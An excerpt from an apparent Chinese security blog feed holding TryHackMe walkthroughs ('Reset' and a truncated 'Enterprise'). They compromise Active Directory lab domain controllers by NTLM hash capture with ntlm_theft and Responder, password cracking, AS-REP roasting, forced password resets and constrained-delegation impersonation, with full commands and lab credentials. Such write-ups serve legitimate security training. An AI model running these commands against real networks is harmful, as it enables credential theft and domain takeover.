class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=HayStack.thm.corp</span><br><span class="line">| Not valid before: 2024-10-24T05:48:35</span><br><span class="line">|_Not valid after:  2025-04-25T05:48:35</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: THM</span><br><span class="line">|   NetBIOS_Domain_Name: THM</span><br><span class="line">|   NetBIOS_Computer_Name: HAYSTACK</span><br><span class="line">|   DNS_Domain_Name: thm.corp</span><br><span class="line">|   DNS_Computer_Name: HayStack.thm.corp</span><br><span class="line">|   DNS_Tree_Name: thm.corp</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-25T05:51:48+00:00</span><br><span class="line">|_ssl-date: 2024-10-25T05:53:13+00:00; +22s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line">49670/tcp open  unknown</span><br><span class="line">49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49675/tcp open  unknown</span><br><span class="line">49703/tcp open  unknown</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches for host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 21s, deviation: 0s, median: 21s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-25T05:51:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   662.94 ms 10.14.0.1</span><br><span class="line">2   663.13 ms 10.10.219.65</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 249.78 seconds</span><br></pre></td></tr></table></figure><p>可以看出这是一台域控，并且域名是<code>HayStack.thm.corp</code>，将这个和<code>thm.corp</code>添加到<code>/etc/hosts</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135202309-1900674591.png" alt="image-20241025135138717"></p><p>尝试连接<code>Data</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.219.65/Data</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135505429-2020002712.png" alt="image-20241025135442301"></p><p>发现每次操作文件名都会变化，先将文件下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135646463-1583002200.png" alt="image-20241025135623489"></p><p>找到初始密码<code>ResetMe123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135729828-1298084476.png" alt="image-20241025135706715"></p><p>在另一个pdf文件中发现一组用户名密码<code>LILY ONEILL:ResetMe123!</code></p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.219.65</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025140240543-805157185.png" alt="image-20241025140217254"></p><p>并没有什么信息</p><h1 id="获取user-txt"><a href="#获取user-txt" class="headerlink" title="获取user.txt"></a>获取user.txt</h1><p>在之前进行smb探测的时候发现目录会随着每次访问，在一定时间后就会改变文件名，说明不止我们一个人在访问这个目录，所以我们可以使用工具尝试在smb中捕获另一个人的hash</p><p>使用<a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a>工具创建恶意文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py -g url -s 10.14.90.122 -f aaa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142209751-1923196893.png" alt="image-20241025142146578"></p><p>在攻击机上监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure><p>将生成的文件传到靶机上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142655232-1422163173.png" alt="image-20241025142631944"></p><p>在监听处我们就捕获到了一组hash</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142755759-907774947.png" alt="image-20241025142732867"></p><p>将其保存到<code>hash</code>文件，用于破解</p><p>使用<code>john</code>工具破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143503161-1529556282.png" alt="image-20241025143439961"></p><p>成功获取<code>AUTOMATE</code>的密码<code>Passw0rd1</code></p><p>尝试登录</p><p><code>evil-winrm -i 10.10.219.65 -u AUTOMATE -p Passw0rd1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143817037-942278707.png" alt="image-20241025143753555"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>使用<code>bloodhound-pytohn</code>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u automate -p Passw0rd1 -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025144647833-553174619.png" alt="image-20241025144624398"></p><p>将收集的信息使用<code>Bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025150432464-189680214.png" alt="image-20241025150408916"></p><p>发现有三个能够<code>AS-REP</code>攻击的用户</p><ul><li><code>ERNESTO_SILVA@THM.CORP</code></li><li><code>TABATHA_BRITT@THM.CORP</code></li><li><code>LEANN_LONG@THM.CORP</code></li></ul><p>将用户名保存到<code>users</code>文件</p><p>使用<code>GetNPUsers.py</code>请求用户的<code>TGT</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py thm.corp/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025151452294-1718262734.png" alt="image-20241025151428929"></p><p>分别使用<code>john</code>爆破</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025152715817-367967576.png" alt="image-20241025152652439"></p><p>最终发现只有<code>TABATHA_BRITT</code>用户成功爆破，密码是<code>marlboro(1985)</code></p><p>再对该用户进行信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u TABATHA_BRITT -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025161327821-1280956437.png" alt="image-20241025161304577">将收集的信息使用<code>Bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162900833-2005768447.png" alt="image-20241025162837120"></p><p>找到利用链，我们想要到达<code>DARLA_WINTERS</code>，就是从<code>TABATHA_BRITT</code>到<code>SHAWMA_BRAY</code>的<code>GenericAll</code>，利用<code>ForceChangePassword</code>从<code>SHAWMA_BRAY</code>到<code>CRUZZ_HALL</code>，最后利用<code>GenericWrite</code>从<code>CRUZ_HALL</code>到<code>DARLA_WINTERS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162314922-442943433.png" alt="image-20241025162252026"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162215576-292168178.png" alt="image-20241025162152712"></p><p>我们发现可以通过<code>RPC</code>利用<code>GenericAll</code>更改用户的密码，对于<code>ForceChangePassword</code>和<code>GenericWrite</code>同样可以适用</p><p>我们使用<code>TABATHA_BRITT</code>用户来操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;SHAWNA_BRAY&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;thm.corp&quot;</span>/<span class="string">&quot;TABATHA_BRITT&quot;</span>%<span class="string">&quot;marlboro(1985)&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;CRUZ_HALL&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;SHAWNA_BRAY&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;DARLA_WINTERS&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;CRUZ_HALL&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025164851767-362787753.png" alt="image-20241025164828710"></p><p>使用<code>crackmapexec</code>验证一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.219.65 -u DARLA_WINTERS -p <span class="string">&#x27;Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025165457028-896741427.png" alt="image-20241025165434092"></p><p>修改成功！再对<code>DARLA_WINTERS</code>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u <span class="string">&#x27;DARLA_WINTERS&#x27;</span> -p <span class="string">&#x27;Aa123456!&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025172857716-1006065661.png" alt="image-20241025172834592"></p><p>发现<code>DARLA_WINTERS</code>用户可以通过<code>CIFS</code>服务进行委派攻击，我们就可以模拟域控上<code>CIFS</code>服务的管理员</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p><code>Impacket</code> 的<code>getST</code>脚本将请求服务的<code>Ticket</code> 并将其保存为 <code>ccache</code>。如果帐户具有受限的委派权限，可以使用 <code>-impersonate</code> 标志代表其他用户请求票证。</p><p>使用 <code>impacket</code> 的<code>getST.py</code>获取票据</p><p>在请求票据之前，我们先输入下面这个命令。这个命令可以从指定的 NTP 服务器上获取准确的时间，并将系统时间调整到与之同步。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s haystack.thm.corp</span><br></pre></td></tr></table></figure><p>然后再开始获取票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&quot;cifs/haystack.thm.corp&quot;</span> -dc-ip 10.10.219.65 -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;thm.corp/DARLA_WINTERS:Aa123456!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025175746257-1822396632.png" alt="image-20241025175722380"></p><p>使用<code>KRB5CCNAME</code>环境变量设置 <code>ccache</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache</span><br></pre></td></tr></table></figure><p>再使用<code>wmiexec.py</code>登录<code>Administrator</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -k -no-pass Administrator@haystack.thm.corp</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181710304-1116480087.png" alt="image-20241025181646460"></p><p>成功获得<code>Administrator</code>的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181908376-2067529138.png" alt="image-20241025181845059"></p><p>在<code>Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Reset</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>THM-Enterprise</title>
    <link href="https://ya1orin.github.io/posts/f6320aec.html"/>
    <id>https://ya1orin.github.io/posts/f6320aec.html</id>
    <published>2024-10-23T07:42:46.000Z</published>
    <updated>2024-11-15T09:36:21.010Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.76.81</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.184.113</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 15:44 CST</span><br><span class="line">Warning: 10.10.184.113 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.184.113</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 59956 closed tcp ports (reset), 5552 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-23 07:44:58Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Computer_Name: LAB-DC</span><br><span class="line">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Tree_Name: ENTERPRISE.THM</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-23T07:46:13+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">| Not valid before: 2024-10-22T07:43:23</span><br><span class="line">|_Not valid after:  2025-04-23T07:43:23</span><br><span class="line">|_ssl-date: 2024-10-23T07:46:26+00:00; -1s from scanner time.</span><br><span class="line">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">7990/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Log in to continue - Log in with Atlassian account</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49679/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49713/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=10/23%OT=53%CT=1%CU=31414%PV=Y%DS=2%DC=T%G=Y%TM=671</span><br><span class="line">OS:8A9DA%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=RD%II=I%SS=</span><br><span class="line">OS:S%TS=U)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=102%GCD=</span><br><span class="line">OS:1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%I</span><br><span class="line">OS:I=I%SS=S%TS=U)OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O</span><br><span class="line">OS:5=M509NW8NNS%O6=M509NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=F</span><br><span class="line">OS:F70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A</span><br><span class="line">OS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=</span><br><span class="line">OS:Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R</span><br><span class="line">OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=</span><br><span class="line">OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U</span><br><span class="line">OS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF</span><br><span class="line">OS:I=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-23T07:46:15</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   359.39 ms 10.14.0.1</span><br><span class="line">2   360.71 ms 10.10.184.113</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 144.50 seconds</span><br></pre></td></tr></table></figure><p>不难看出这是一台域控机器，开放了若干端口，域名为<code>LAB.ENTERPRISE.THM</code>，将其添加到<code>/etc/hosts</code>文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023164304313-1442381621.png" alt="image-20241023164242012"></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>先简单探测下smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155144317-1847528457.png" alt="image-20241023155122981"></p><p>发现一些共享目录，尝试匿名登陆访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Docs</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155531326-846039650.png" alt="image-20241023155511089"></p><p>发现两个文件<code>get</code>下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Users</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155623661-1766656713.png" alt="image-20241023155603137"></p><p>把<code>desktop.ini</code>下载下来，同时在<code>Users</code>目录中，找到一些用户名</p><p>将用户名保存下来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155922742-1623262837.png" alt="image-20241023155901976"></p><p>在<code>Default</code>目录中找到些文件，查看一下之前下载的文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160456960-1428865174.png" alt="image-20241023160434574"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160539318-945036663.png" alt="image-20241023160516110"></p><p>发现这两个文件需要密码才能查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160627583-292902303.png" alt="image-20241023160602672"></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160131115-1178226363.png" alt="image-20241023160110776"></p><p>默认页面没什么信息，扫描一下后台</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160734235-742745560.png" alt="image-20241023160710469"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160820658-791344310.png" alt="image-20241023160753616"></p><p>没啥用</p><h2 id="7990端口"><a href="#7990端口" class="headerlink" title="7990端口"></a>7990端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162220892-1397336076.png" alt="image-20241023162156550"></p><p>这是一个<code>Atlassian</code>并且发现内容是<code>Enterprise-THM</code>，正在迁移至github，我们上去google搜索一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162740885-2011563018.png" alt="image-20241023162718049"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162838024-1090127372.png" alt="image-20241023162813746"></p><p>注意到有个用户<code>Nik-enterprise-dev</code>，里面有一个库<code>mgmtScript.ps1</code>，库里面还有个ps1文件<code>mgmtScript.ps1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163037619-1307610051.png" alt="image-20241023163010726"></p><p>查看一下历史记录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163133624-1566744799.png" alt="image-20241023163105667"></p><p>发现了他的用户名及密码<code>nik:ToastyBoi!</code></p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p>有了一组用户凭据，尝试探测一下<code>rpc</code>，枚举一下用户</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient lab.enterprise.thm -U nik --password=<span class="string">&quot;ToastyBoi!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023190844546-934835508.png" alt="image-20241023190823732"></p><p>找到很多域用户，将其保存到<code>users</code>文件中，方便后续利用</p><h1 id="rdp登录bitbucket"><a href="#rdp登录bitbucket" class="headerlink" title="rdp登录bitbucket"></a>rdp登录bitbucket</h1><p>有了一组凭据和用户名列表就可以尝试<code>AS-REP Roasting</code>，检查一下域中用户是否有用户禁用了预身份验证，如果有的话，我们就可以请求<code>TGT</code>密钥，就可以尝试离线破解密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py lab.enterprise.thm/ -usersfile <span 